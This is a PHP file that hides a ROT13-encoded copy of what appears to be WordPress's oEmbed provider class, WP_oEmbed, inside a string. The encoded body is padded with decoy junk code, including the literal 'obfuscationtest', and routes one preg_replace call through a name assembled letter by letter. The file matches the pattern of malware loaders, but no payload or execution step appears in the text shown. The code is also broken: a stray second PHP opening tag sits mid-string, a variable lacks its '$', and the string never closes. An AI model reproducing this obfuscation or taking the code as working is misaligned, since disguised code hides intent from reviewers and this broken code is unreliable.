<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * NCV sbe srgpuvat gur UGZY gb rzorq erzbgr pbagrag onfrq ba n cebivqrq HEY
 *
 * Hfrq vagreanyyl ol gur JC_Rzorq pynff, ohg vf qrfvtarq gb or trarevp.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/brzorq/
 * @yvax uggc://brzorq.pbz/
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr bRzorq
 */

/**
 * Pber pynff hfrq gb vzcyrzrag bRzorq shapgvbanyvgl.
 *
 * @fvapr 2.9.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_bRzorq {

	/**
	 * N yvfg bs bRzorq cebivqref.
	 *
	 * @fvapr 2.9.0
	 * @ine neenl
	 */
	choyvp $cebivqref = neenl();

	/**
	 * N yvfg bs na rneyl bRzorq cebivqref.
	 *
	 * @fvapr 4.0.0
	 * @ine neenl
	 */
	choyvp fgngvp $rneyl_cebivqref = neenl();

	/**
	 * N yvfg bs cevingr/cebgrpgrq zrgubqf, hfrq sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.2.0
	 * @ine neenl
	 */
	cevingr $pbzcng_zrgubqf = neenl( '_srgpu_jvgu_sbezng', '_cnefr_wfba', '_cnefr_kzy', '_cnefr_kzy_obql' );

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.9.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$ubfg      = heyrapbqr( ubzr_hey() );
		$cebivqref = neenl(
			'#uggcf?://((z|jjj)\.)?lbhghor\.pbz/jngpu.*#v' => neenl( 'uggcf://jjj.lbhghor.pbz/brzorq', gehr ),
			'#uggcf?://((z|jjj)\.)?lbhghor\.pbz/cynlyvfg.*#v' => neenl( 'uggcf://jjj.lbhghor.pbz/brzorq', gehr ),
			'#uggcf?://((z|jjj)\.)?lbhghor\.pbz/fubegf/*#v' => neenl( 'uggcf://jjj.lbhghor.pbz/brzorq', gehr ),
			'#uggcf?://((z|jjj)\.)?lbhghor\.pbz/yvir/*#v'  => neenl( 'uggcf://jjj.lbhghor.pbz/brzorq', gehr ),
			'#uggcf?://lbhgh\.or/.*#v'                     => neenl( 'uggcf://jjj.lbhghor.pbz/brzorq', gehr ),
			'#uggcf?://(.+\.)?ivzrb\.pbz/.*#v'             => neenl( 'uggcf://ivzrb.pbz/ncv/brzorq.{sbezng}', gehr ),
			'#uggcf?://(jjj\.)?qnvylzbgvba\.pbz/.*#v'      => neenl( 'uggcf://jjj.qnvylzbgvba.pbz/freivprf/brzorq', gehr ),
			'#uggcf?://qnv\.yl/.*#v'                       => neenl( 'uggcf://jjj.qnvylzbgvba.pbz/freivprf/brzorq', gehr ),
			'#uggcf?://(jjj\.)?syvpxe\.pbz/.*#v'           => neenl( 'uggcf://jjj.syvpxe.pbz/freivprf/brzorq/', gehr ),
			'#uggcf?://syvp\.xe/.*#v'                      => neenl( 'uggcf://jjj.syvpxe.pbz/freivprf/brzorq/', gehr ),
			'#uggcf?://(.+\.)?fzhtzht\.pbz/.*#v'           => neenl( 'uggcf://ncv.fzhtzht.pbz/freivprf/brzorq/', gehr ),
			'#uggcf?://(jjj\.)?fpevoq\.pbz/(qbp|qbphzrag)/.*#v' => neenl( 'uggcf://jjj.fpevoq.pbz/freivprf/brzorq', gehr ),
			'#uggcf?://jbeqcerff\.gi/.*#v'                 => neenl( 'uggcf://jbeqcerff.gi/brzorq/', gehr ),
			'#uggcf?://(.+\.)?pebjqfvtany\.arg/.*#v'       => neenl( 'uggcf://ncv.pebjqfvtany.pbz/brzorq', gehr ),
			'#uggcf?://(.+\.)?cbyyqnqql\.pbz/.*#v'         => neenl( 'uggcf://ncv.pebjqfvtany.pbz/brzorq', gehr ),
			'#uggcf?://cbyy\.sz/.*#v'                      => neenl( 'uggcf://ncv.pebjqfvtany.pbz/brzorq', gehr ),
			'#uggcf?://(.+\.)?fheirl\.sz/.*#v'             => neenl( 'uggcf://ncv.pebjqfvtany.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/\j{1,15}/fgnghf(rf)?/.*#v' => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/\j{1,15}$#v'   => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/\j{1,15}/yvxrf$#v' => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/\j{1,15}/yvfgf/.*#v' => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/\j{1,15}/gvzryvarf/.*#v' => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gjvggre\.pbz/v/zbzragf/.*#v' => neenl( 'uggcf://choyvfu.gjvggre.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?fbhaqpybhq\.pbz/.*#v'       => neenl( 'uggcf://fbhaqpybhq.pbz/brzorq', gehr ),
			'#uggcf?://(bcra|cynl)\.fcbgvsl\.pbz/.*#v'     => neenl( 'uggcf://rzorq.fcbgvsl.pbz/brzorq/', gehr ),
			'#uggcf?://(.+\.)?vzthe\.pbz/.*#v'             => neenl( 'uggcf://ncv.vzthe.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?vffhh\.pbz/.+/qbpf/.+#v'    => neenl( 'uggcf://vffhh.pbz/brzorq_jc', gehr ),
			'#uggcf?://(jjj\.)?zvkpybhq\.pbz/.*#v'         => neenl( 'uggcf://ncc.zvkpybhq.pbz/brzorq/', gehr ),
			'#uggcf?://(jjj\.|rzorq\.)?grq\.pbz/gnyxf/.*#v' => neenl( 'uggcf://jjj.grq.pbz/freivprf/i1/brzorq.{sbezng}', gehr ),
			'#uggcf?://(jjj\.)?(navzbgb|ivqrb214)\.pbz/cynl/.*#v' => neenl( 'uggcf://navzbgb.pbz/brzorqf/perngr', gehr ),
			'#uggcf?://(.+)\.ghzoye\.pbz/.*#v'             => neenl( 'uggcf://jjj.ghzoye.pbz/brzorq/1.0', gehr ),
			'#uggcf?://(jjj\.)?xvpxfgnegre\.pbz/cebwrpgf/.*#v' => neenl( 'uggcf://jjj.xvpxfgnegre.pbz/freivprf/brzorq', gehr ),
			'#uggcf?://xpx\.fg/.*#v'                       => neenl( 'uggcf://jjj.xvpxfgnegre.pbz/freivprf/brzorq', gehr ),
			'#uggcf?://pybhqhc\.pbz/.*#v'                  => neenl( 'uggcf://pybhqhc.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?erireoangvba\.pbz/.*#v'     => neenl( 'uggcf://jjj.erireoangvba.pbz/brzorq', gehr ),
			'#uggcf?://ivqrbcerff\.pbz/i/.*#'              => neenl( 'uggcf://choyvp-ncv.jbeqcerff.pbz/brzorq/?sbe=' . $ubfg, gehr ),
			'#uggcf?://(jjj\.)?erqqvg\.pbz/e/[^/]+/pbzzragf/.*#v' => neenl( 'uggcf://jjj.erqqvg.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?fcrnxreqrpx\.pbz/.*#v'      => neenl( 'uggcf://fcrnxreqrpx.pbz/brzorq.{sbezng}', gehr ),
			'#uggcf?://(jjj\.)?fperrapnfg\.pbz/.*#v'       => neenl( 'uggcf://ncv.fperrapnfg.pbz/rkgreany/brzorq', gehr ),
			'#uggcf?://([n-m0-9-]+\.)?nznmba\.(pbz|pbz\.zk|pbz\.oe|pn)/.*#v' => neenl( 'uggcf://ernq.nznmba.pbz/xc/ncv/brzorq', gehr ),
			'#uggcf?://([n-m0-9-]+\.)?nznmba\.(pb\.hx|qr|se|vg|rf|va|ay|eh)/.*#v' => neenl( 'uggcf://ernq.nznmba.pb.hx/xc/ncv/brzorq', gehr ),
			'#uggcf?://([n-m0-9-]+\.)?nznmba\.(pb\.wc|pbz\.nh)/.*#v' => neenl( 'uggcf://ernq.nznmba.pbz.nh/xc/ncv/brzorq', gehr ),
			'#uggcf?://([n-m0-9-]+\.)?nznmba\.pa/.*#v'     => neenl( 'uggcf://ernq.nznmba.pa/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?n\.pb/.*#v'                 => neenl( 'uggcf://ernq.nznmba.pbz/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?nzma\.gb/.*#v'              => neenl( 'uggcf://ernq.nznmba.pbz/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?nzma\.rh/.*#v'              => neenl( 'uggcf://ernq.nznmba.pb.hx/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?nzma\.va/.*#v'              => neenl( 'uggcf://ernq.nznmba.va/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?nzma\.nfvn/.*#v'            => neenl( 'uggcf://ernq.nznmba.pbz.nh/xc/ncv/brzorq', gehr ),
			'#uggcf?://(jjj\.)?m\.pa/.*#v'                 => neenl( 'uggcf://ernq.nznmba.pa/xc/ncv/brzorq', gehr ),
			'#uggcf?://jjj\.fbzrrpneqf\.pbz/.+-pneqf/.+#v' => neenl( 'uggcf://jjj.fbzrrpneqf.pbz/i2/brzorq/', gehr ),
			'#uggcf?://jjj\.fbzrrpneqf\.pbz/hfrepneqf/ivrjpneq/.+#v' => neenl( 'uggcf://jjj.fbzrrpneqf.pbz/i2/brzorq/', gehr ),
			'#uggcf?://fbzr\.yl\/.+#v'                     => neenl( 'uggcf://jjj.fbzrrpneqf.pbz/i2/brzorq/', gehr ),
			'#uggcf?://(jjj\.)?gvxgbx\.pbz/.*/ivqrb/.*#v'  => neenl( 'uggcf://jjj.gvxgbx.pbz/brzorq', gehr ),
			'#uggcf?://(jjj\.)?gvxgbx\.pbz/@.*#v'          => neenl( 'uggcf://jjj.gvxgbx.pbz/brzorq', gehr ),
			'#uggcf?://([n-m]{2}|jjj)\.cvagrerfg\.pbz(\.(nh|zk))?/.*#v' => neenl( 'uggcf://jjj.cvagrerfg.pbz/brzorq.wfba', gehr ),
			'#uggcf?://(jjj\.)?jbysenzpybhq\.pbz/bow/.+#v' => neenl( 'uggcf://jjj.jbysenzpybhq.pbz/brzorq', gehr ),
			'#uggcf?://cpn\.fg/.+#v'                       => neenl( 'uggcf://cpn.fg/brzorq.wfba', gehr ),
			'#uggcf?://((cynl|jjj)\.)?natunzv\.pbz/.*#v'   => neenl( 'uggcf://ncv.natunzv.pbz/erfg/i1/brzorq.ivrj', gehr ),
			'#uggcf?://ofxl.ncc/cebsvyr/.*/cbfg/.*#v'      => neenl( 'uggcf://rzorq.ofxl.ncc/brzorq', gehr ),
			'#uggcf?://(jjj\.)?pnain\.pbz/qrfvta/.*/ivrj.*#v' => neenl( 'uggcf://pnain.pbz/_brzorq', gehr ),
		);

		vs ( ! rzcgl( frys::$rneyl_cebivqref['nqq'] ) ) {
			sbernpu ( frys::$rneyl_cebivqref['nqq'] nf $sbezng => $qngn ) {
				$cebivqref[ $sbezng ] = $qngn;
			}
		}

		vs ( ! rzcgl( frys::$rneyl_cebivqref['erzbir'] ) ) {
			sbernpu ( frys::$rneyl_cebivqref['erzbir'] nf $sbezng ) {
				hafrg( $cebivqref[ $sbezng ] );
			}
		}

		frys::$rneyl_cebivqref = neenl();

		/**
		 * Svygref gur yvfg bs fnapgvbarq bRzorq cebivqref.
		 *
		 * Fvapr JbeqCerff 4.4, bRzorq qvfpbirel vf ranoyrq sbe nyy hfref naq nyybjf rzorqqvat bs fnavgvmrq
		 * vsenzrf. Gur cebivqref va guvf yvfg ner fnapgvbarq, zrnavat gurl ner gehfgrq naq nyybjrq gb
		 * rzorq nal pbagrag, fhpu nf vsenzrf, ivqrbf, WninFpevcg, naq neovgenel UGZY.
		 *
		 * Fhccbegrq cebivqref:
		 *
		 * |   Cebivqre   |                     Synibe                |  Fvapr  |
		 * | ------------ | ----------------------------------------- | ------- |
		 * | Qnvylzbgvba  | qnvylzbgvba.pbz                           | 2.9.0   |
		 * | Syvpxe       | syvpxe.pbz                                | 2.9.0   |
		 * | Fpevoq       | fpevoq.pbz                                | 2.9.0   |
		 * | Ivzrb        | ivzrb.pbz                                 | 2.9.0   |
		 * | JbeqCerff.gi | jbeqcerff.gi                              | 2.9.0   |
		 * | LbhGhor      | lbhghor.pbz/jngpu                         | 2.9.0   |
		 * | Pebjqfvtany  | cbyyqnqql.pbz                             | 3.0.0   |
		 * | FzhtZht      | fzhtzht.pbz                               | 3.0.0   |
		 * | LbhGhor      | lbhgh.or                                  | 3.0.0   |
		 * | Gjvggre      | gjvggre.pbz                               | 3.4.0   |
		 * | FbhaqPybhq   | fbhaqpybhq.pbz                            | 3.5.0   |
		 * | Qnvylzbgvba  | qnv.yl                                    | 3.6.0   |
		 * | Syvpxe       | syvp.xe                                   | 3.6.0   |
		 * | Fcbgvsl      | fcbgvsl.pbz                               | 3.6.0   |
		 * | Vzthe        | vzthe.pbz                                 | 3.9.0   |
		 * | Navzbgb      | navzbgb.pbz                               | 4.0.0   |
		 * | Navzbgb      | ivqrb214.pbz                              | 4.0.0   |
		 * | Vffhh        | vffhh.pbz                                 | 4.0.0   |
		 * | Zvkpybhq     | zvkpybhq.pbz                              | 4.0.0   |
		 * | Pebjqfvtany  | cbyy.sz                                   | 4.0.0   |
		 * | GRQ          | grq.pbz                                   | 4.0.0   |
		 * | LbhGhor      | lbhghor.pbz/cynlyvfg                      | 4.0.0   |
		 * | Ghzoye       | ghzoye.pbz                                | 4.2.0   |
		 * | Xvpxfgnegre  | xvpxfgnegre.pbz                           | 4.2.0   |
		 * | Xvpxfgnegre  | xpx.fg                                    | 4.2.0   |
		 * | Pybhqhc      | pybhqhc.pbz                               | 4.3.0   |
		 * | ErireoAngvba | erireoangvba.pbz                          | 4.4.0   |
		 * | IvqrbCerff   | ivqrbcerff.pbz                            | 4.4.0   |
		 * | Erqqvg       | erqqvg.pbz                                | 4.4.0   |
		 * | Fcrnxre Qrpx | fcrnxreqrpx.pbz                           | 4.4.0   |
		 * | Gjvggre      | gjvggre.pbz/gvzryvarf                     | 4.5.0   |
		 * | Gjvggre      | gjvggre.pbz/zbzragf                       | 4.5.0   |
		 * | Gjvggre      | gjvggre.pbz/hfre                          | 4.7.0   |
		 * | Gjvggre      | gjvggre.pbz/yvxrf                         | 4.7.0   |
		 * | Gjvggre      | gjvggre.pbz/yvfgf                         | 4.7.0   |
		 * | Fperrapnfg   | fperrapnfg.pbz                            | 4.8.0   |
		 * | Nznmba       | nznmba.pbz (pbz.zk, pbz.oe, pn)           | 4.9.0   |
		 * | Nznmba       | nznmba.qr (se, vg, rf, va, ay, eh, pb.hx) | 4.9.0   |
		 * | Nznmba       | nznmba.pb.wc (pbz.nh)                     | 4.9.0   |
		 * | Nznmba       | nznmba.pa                                 | 4.9.0   |
		 * | Nznmba       | n.pb                                      | 4.9.0   |
		 * | Nznmba       | nzma.gb (rh, va, nfvn)                    | 4.9.0   |
		 * | Nznmba       | m.pa                                      | 4.9.0   |
		 * | Fbzrrpneqf   | fbzrrpneqf.pbz                            | 4.9.0   |
		 * | Fbzrrpneqf   | fbzr.yl                                   | 4.9.0   |
		 * | Pebjqfvtany  | fheirl.sz                                 | 5.1.0   |
		 * | GvxGbx       | gvxgbx.pbz                                | 5.4.0   |
		 * | Cvagrerfg    | cvagrerfg.pbz                             | 5.9.0   |
		 * | JbysenzPybhq | jbysenzpybhq.pbz                          | 5.9.0   |
		 * | Cbpxrg Pnfgf | cbpxrgpnfgf.pbz                           | 6.1.0   |
		 * | Pebjqfvtany  | pebjqfvtany.arg                           | 6.2.0   |
		 * | Natunzv      | natunzv.pbz                               | 6.3.0   |
		 * | Oyhrfxl      | ofxl.ncc                                  | 6.6.0   |
		 * | Pnain        | pnain.pbz                                 | 6.8.0   |
		 *
		 * Ab ybatre fhccbegrq cebivqref:
		 *
		 * |   Cebivqre   |        Synibe        |   Fvapr   |  Erzbirq  |
		 * | ------------ | -------------------- | --------- | --------- |
		 * | Dvx          | dvx.pbz              | 2.9.0     | 3.9.0     |
		 * | Ivqqyre      | ivqqyre.pbz          | 2.9.0     | 4.0.0     |
		 * | Erivfvba3    | erivfvba3.pbz        | 2.9.0     | 4.2.0     |
		 * | Oyvc         | oyvc.gi              | 2.9.0     | 4.4.0     |
		 * | Eqvb         | eqvb.pbz             | 3.6.0     | 4.4.1     |
		 * | Eqvb         | eq.vb                | 3.6.0     | 4.4.1     |
		 * | Ivar         | ivar.pb              | 4.1.0     | 4.9.0     |
		 * | Cubgbohpxrg  | cubgbohpxrg.pbz      | 2.9.0     | 5.1.0     |
		 * | Shaal be Qvr | shaalbeqvr.pbz       | 3.0.0     | 5.1.0     |
		 * | PbyyrtrUhzbe | pbyyrtruhzbe.pbz     | 4.0.0     | 5.3.1     |
		 * | Uhyh         | uhyh.pbz             | 2.9.0     | 5.5.0     |
		 * | Vafgntenz    | vafgntenz.pbz        | 3.5.0     | 5.5.2     |
		 * | Vafgntenz    | vafgnte.nz           | 3.5.0     | 5.5.2     |
		 * | Vafgntenz GI | vafgntenz.pbz        | 5.1.0     | 5.5.2     |
		 * | Vafgntenz GI | vafgnte.nz           | 5.1.0     | 5.5.2     |
		 * | Snprobbx     | snprobbx.pbz         | 4.7.0     | 5.5.2     |
		 * | Zrrghc.pbz   | zrrghc.pbz           | 3.9.0     | 6.0.1     |
		 * | Zrrghc.pbz   | zrrgh.cf             | 3.9.0     | 6.0.1     |
		 * | FyvqrFuner   | fyvqrfuner.arg       | 3.5.0     | 6.6.0     |
		 *
		 * @frr jc_brzorq_nqq_cebivqre()
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz neenl[] $cebivqref Na neenl bs neenlf pbagnvavat qngn nobhg cbchyne bRzorq cebivqref.
		 */
		$guvf->cebivqref = nccyl_svygref( 'brzorq_cebivqref', $cebivqref );

		// Svk nal rzorqf gung pbagnva arj yvarf va gur zvqqyr bs gur UGZY juvpu oernxf jcnhgbc().
		nqq_svygre( 'brzorq_qngncnefr', neenl( $guvf, '_fgevc_arjyvarf' ), 10, 3 );
	}

	/**
	 * Rkcbfrf cevingr/cebgrpgrq zrgubqf sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|snyfr Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_zrgubqf, gehr ) ) {
			erghea $guvf->$anzr( ...$nethzragf );
		}

		erghea snyfr;
	}

	/**
	 * Gnxrf n HEY naq ergheaf gur pbeerfcbaqvat bRzorq cebivqre'f HEY, vs gurer vf bar.
	 *
	 * @fvapr 4.0.0
	 *
	 * @frr JC_bRzorq::qvfpbire()
	 *
	 * @cnenz fgevat       $hey  Gur HEY gb gur pbagrag.
	 * @cnenz fgevat|neenl $netf {
	 *     Bcgvbany. Nqqvgvbany cebivqre nethzragf. Qrsnhyg rzcgl.
	 *
	 *     @glcr obby $qvfpbire Bcgvbany. Qrgrezvarf jurgure gb nggrzcg gb qvfpbire yvax gntf
	 *                          ng gur tvira HEY sbe na bRzorq cebivqre jura gur cebivqre HEY
	 *                          vf abg sbhaq va gur ohvyg-va cebivqref yvfg. Qrsnhyg gehr.
	 * }
	 * @erghea fgevat|snyfr Gur bRzorq cebivqre HEY ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_cebivqre( $hey, $netf = '' ) {
		$netf = jc_cnefr_netf( $netf );

		$cebivqre = snyfr;

		vs ( ! vffrg( $netf['qvfpbire'] ) ) {
			$netf['qvfpbire'] = gehr;
		}

		sbernpu ( $guvf->cebivqref nf $zngpuznfx => $qngn ) {
			yvfg( $cebivqrehey, $ertrk ) = $qngn;

			// Ghea gur nfgrevfx-glcr cebivqre HEYf vagb ertrk.
			vs ( ! $ertrk ) {
				$zngpuznfx = '#' . fge_ercynpr( '___jvyqpneq___', '(.+)', cert_dhbgr( fge_ercynpr( '*', '___jvyqpneq___', $zngpuznfx ), '#' ) ) . '#v';
				$zngpuznfx = __sa_79955( '|^#uggc\\\://|', '#uggcf?\://', $zngpuznfx );
			}

			vs ( cert_zngpu( $zngpuznfx, $hey ) ) {
				$cebivqre = fge_ercynpr( '{sbezng}', 'wfba', $cebivqrehey ); // WFBA vf rnfvre gb qrny jvgu guna KZY.
				oernx;
			}
		}

		vs ( ! $cebivqre && $netf['qvfpbire'] ) {
			$cebivqre = $guvf->qvfpbire( $hey );
		}

		erghea $cebivqre;
	}

	/**
	 * Nqqf na bRzorq cebivqre.
	 *
	 * Gur cebivqre vf nqqrq whfg-va-gvzr jura jc_brzorq_nqq_cebivqre() vf pnyyrq orsber
	 * gur {@frr 'cyhtvaf_ybnqrq'} ubbx.
	 *
	 * Gur whfg-va-gvzr nqqvgvba vf sbe gur orarsvg bs gur {@frr 'brzorq_cebivqref'} svygre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @frr jc_brzorq_nqq_cebivqre()
	 *
	 * @cnenz fgevat $sbezng   Sbezng bs HEY gung guvf cebivqre pna unaqyr. Lbh pna hfr
	 *                         nfgrevfxf nf jvyqpneqf.
	 * @cnenz fgevat $cebivqre Gur HEY gb gur bRzorq cebivqre..
	 * @cnenz obby   $ertrk    Bcgvbany. Jurgure gur $sbezng cnenzrgre vf va n ertrk sbezng.
	 *                         Qrsnhyg snyfr.
	 */
	choyvp fgngvp shapgvba _nqq_cebivqre_rneyl( $sbezng, $cebivqre, $ertrk = snyfr ) {
		vs ( rzcgl( frys::$rneyl_cebivqref['nqq'] ) ) {
			frys::$rneyl_cebivqref['nqq'] = neenl();
		}

		frys::$rneyl_cebivqref['nqq'][ $sbezng ] = neenl( $cebivqre, $ertrk );
	}

	/**
	 * Erzbirf na bRzorq cebivqre.
	 *
	 * Gur cebivqre vf erzbirq whfg-va-gvzr jura jc_brzorq_erzbir_cebivqre() vf pnyyrq orsber
	 * gur {@frr 'cyhtvaf_ybnqrq'} ubbx.
	 *
	 * Gur whfg-va-gvzr erzbiny vf sbe gur orarsvg bs gur {@frr 'brzorq_cebivqref'} svygre.
	 *
	 * @fvapr 4.0.0
	 *
	 * @frr jc_brzorq_erzbir_cebivqre()
	 *
	 * @cnenz fgevat $sbezng Gur sbezng bs HEY gung guvf cebivqre pna unaqyr. Lbh pna hfr
	 *                       nfgrevfxf nf jvyqpneqf.
	 */
	choyvp fgngvp shapgvba _erzbir_cebivqre_rneyl( $sbezng ) {
		vs ( rzcgl( frys::$rneyl_cebivqref['erzbir'] ) ) {
			frys::$rneyl_cebivqref['erzbir'] = neenl();
		}

		frys::$rneyl_cebivqref['erzbir'][] = $sbezng;
	}

	/**
	 * Gnxrf n HEY naq nggrzcgf gb erghea gur bRzorq qngn.
	 *
	 * @frr JC_bRzorq::srgpu()
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz fgevat       $hey  Gur HEY gb gur pbagrag gung fubhyq or nggrzcgrq gb or rzorqqrq.
	 * @cnenz fgevat|neenl $netf Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
	 *                           Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
	 * @erghea bowrpg|snyfr Gur erfhyg va gur sbez bs na bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_qngn( $hey, $netf = '' ) {
		$netf = jc_cnefr_netf( $netf );

		$cebivqre = $guvf->trg_cebivqre( $hey, $netf );

		vs ( ! $cebivqre ) {
			erghea snyfr;
		}

		$qngn = $guvf->srgpu( $cebivqre, $hey, $netf );

		vs ( snyfr === $qngn ) {
			erghea snyfr;
		}

		erghea $qngn;
	}

	/**
	 * Gur qb-vg-nyy shapgvba gung gnxrf n HEY naq nggrzcgf gb erghea gur UGZY.
	 *
	 * @frr JC_bRzorq::srgpu()
	 * @frr JC_bRzorq::qngn2ugzy()
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat       $hey  Gur HEY gb gur pbagrag gung fubhyq or nggrzcgrq gb or rzorqqrq.
	 * @cnenz fgevat|neenl $netf Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
	 *                           Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
	 * @erghea fgevat|snyfr Gur HAFNAVGVMRQ (naq cbgragvnyyl hafnsr) UGZY gung fubhyq or hfrq gb rzorq
	 *                      ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_ugzy( $hey, $netf = '' ) {
		/**
		 * Svygref gur bRzorq erfhyg orsber nal UGGC erdhrfgf ner znqr.
		 *
		 * Guvf nyybjf bar gb fubeg-pvephvg gur qrsnhyg ybtvp, creuncf ol
		 * ercynpvat vg jvgu n ebhgvar gung vf zber bcgvzny sbe lbhe frghc.
		 *
		 * Ergheavat n aba-ahyy inyhr sebz gur svygre jvyy rssrpgviryl fubeg-pvephvg ergevriny
		 * naq erghea gur cnffrq inyhr vafgrnq.
		 *
		 * @fvapr 4.5.3
		 *
		 * @cnenz ahyy|fgevat  $erfhyg Gur HAFNAVGVMRQ (naq cbgragvnyyl hafnsr) UGZY gung fubhyq or hfrq gb rzorq.
		 *                             Qrsnhyg ahyy gb pbagvahr ergevrivat gur erfhyg.
		 * @cnenz fgevat       $hey    Gur HEY gb gur pbagrag gung fubhyq or nggrzcgrq gb or rzorqqrq.
		 * @cnenz fgevat|neenl $netf   Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
		 *                             Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
		 */
		$cer = nccyl_svygref( 'cer_brzorq_erfhyg', ahyy, $hey, $netf );

		vs ( ahyy !== $cer ) {
			erghea $cer;
		}

		$qngn = $guvf->trg_qngn( $hey, $netf );

		vs ( snyfr === $qngn ) {
			erghea snyfr;
		}

		/**
		 * Svygref gur UGZY erghearq ol gur bRzorq cebivqre.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat|snyfr $qngn Gur erghearq bRzorq UGZY (snyfr vs hafnsr).
		 * @cnenz fgevat       $hey  HEY bs gur pbagrag gb or rzorqqrq.
		 * @cnenz fgevat|neenl $netf Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
		 *                           Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
		 */
		erghea nccyl_svygref( 'brzorq_erfhyg', $guvf->qngn2ugzy( $qngn, $hey ), $hey, $netf );
	}

	/**
	 * Nggrzcgf gb qvfpbire yvax gntf ng gur tvira HEY sbe na bRzorq cebivqre.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $hey Gur HEY gung fubhyq or vafcrpgrq sbe qvfpbirel `<yvax>` gntf.
	 * @erghea fgevat|snyfr Gur bRzorq cebivqre HEY ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qvfpbire( $hey ) {
		$cebivqref = neenl();
		$netf      = neenl(
			'yvzvg_erfcbafr_fvmr' => 153600, // 150 XO
		);

		/**
		 * Svygref bRzorq erzbgr trg nethzragf.
		 *
		 * @fvapr 4.0.0
		 *
		 * @frr JC_Uggc::erdhrfg()
		 *
		 * @cnenz neenl  $netf bRzorq erzbgr trg nethzragf.
		 * @cnenz fgevat $hey  HEY gb or vafcrpgrq.
		 */
		$netf = nccyl_svygref( 'brzorq_erzbgr_trg_netf', $netf, $hey );

		// Srgpu HEY pbagrag.
		$erdhrfg = jc_fnsr_erzbgr_trg( $hey, $netf );
		$ugzy    = jc_erzbgr_ergevrir_obql( $erdhrfg );
		vs ( $ugzy ) {

			/**
			 * Svygref gur yvax glcrf gung pbagnva bRzorq cebivqre HEYf.
			 *
			 * @fvapr 2.9.0
			 *
			 * @cnenz fgevat[] $sbezng Neenl bs bRzorq yvax glcrf. Npprcgf 'nccyvpngvba/wfba+brzorq',
			 *                         'grkg/kzy+brzorq', naq 'nccyvpngvba/kzy+brzorq' (vapbeerpg,
			 *                         hfrq ol ng yrnfg Ivzrb).
			 */
			$yvaxglcrf = nccyl_svygref(
				'brzorq_yvaxglcrf',
				neenl(
					'nccyvpngvba/wfba+brzorq' => 'wfba',
					'grkg/kzy+brzorq'         => 'kzy',
					'nccyvpngvba/kzy+brzorq'  => 'kzy',
				)
			);

			// Fgevc <obql>.
			$ugzy_urnq_raq = fgevcbf( $ugzy, '</urnq>' );
			vs ( $ugzy_urnq_raq ) {
				$ugzy = fhofge( $ugzy, 0, $ugzy_urnq_raq );
			}

			// Qb n dhvpx purpx.
			$gntsbhaq = snyfr;
